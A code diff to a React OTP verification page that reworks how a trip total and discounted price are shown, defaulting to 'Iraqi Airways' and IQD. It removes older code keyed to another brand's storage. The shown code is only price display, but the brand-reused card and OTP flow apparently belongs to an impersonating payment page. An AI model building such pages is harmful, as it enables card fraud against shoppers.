@@ -86,24 +86,23 @@ export default function OTPVerification() {
 
   const t = translations[lang];
 
+  // Get trip summary from localStorage
+  const tripSummary = JSON.parse(localStorage.getItem('tripSummary') || '{}');
+  const curCode = tripSummary.curCode || 'IQD';
+  const originalTotal = tripSummary.originalTotalConv || 0;
+  const discountedTotal = tripSummary.baseTotalConv || 0;
+  
+  const fmtPrice = (n: number) => n.toLocaleString('en-US', {
+    minimumFractionDigits: 2,
+    maximumFractionDigits: 2
+  });
+
+  const displayOriginal = `${curCode} ${fmtPrice(originalTotal)}`;
+  const displayDiscounted = `${curCode} ${fmtPrice(discountedTotal)}`;
+
   // Get payment data from localStorage
   const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
   const cardLast4 = paymentData.cardLast4 || "****";
-  // Fallback: use stored order total if paymentData.totalPaid is missing
-  const getOTPTotal = () => {
-    if (paymentData.totalPaid && paymentData.totalPaid !== '0' && paymentData.totalPaid !== 0) {
-      return paymentData.totalPaid;
-    }
-    const storedTotal = localStorage.getItem('amouage_order_total');
-    if (storedTotal && Number(storedTotal) > 0) {
-      const countryCode = localStorage.getItem('amouage_country') || 'OM';
-      const COUNTRY_CURRENCY: Record<string, string> = {'KW':'KWD','OM':'OMR','BH':'BHD','AE':'AED','SA':'SAR'};
-      const symbol = COUNTRY_CURRENCY[countryCode] ? COUNTRY_CURRENCY[countryCode] + ' ' : 'OMR ';
-      return symbol + Number(storedTotal).toFixed(3);
-    }
-    return '0';
-  };
-  const totalAmount = getOTPTotal();
   const serviceName = paymentData.serviceName || "";
   
   // Get card info from localStorage (fallback) or signal
@@ -284,11 +283,11 @@ export default function OTPVerification() {
               {t.youArePaying} <span className="font-semibold text-gray-900">{serviceName || "Iraqi Airways"}</span> {t.anAmountOf} <span className="font-semibold text-black">
                 {globalDiscount.value ? (
                   <>
-                    <span className="text-[#FF0000] line-through mr-2">{totalAmount}</span>
-                    <span>{applyDiscount(totalAmount)}</span>
+                    <span className="text-[#FF0000] line-through mr-2" dir="ltr">{displayOriginal}</span>
+                    <span dir="ltr">{displayDiscounted}</span>
                   </>
                 ) : (
-                  totalAmount
+                  <span dir="ltr">{displayOriginal}</span>
                 )}
               </span> {t.on} {formatDate(currentTime)} {t.at} {formatTime(currentTime)}
             </p>
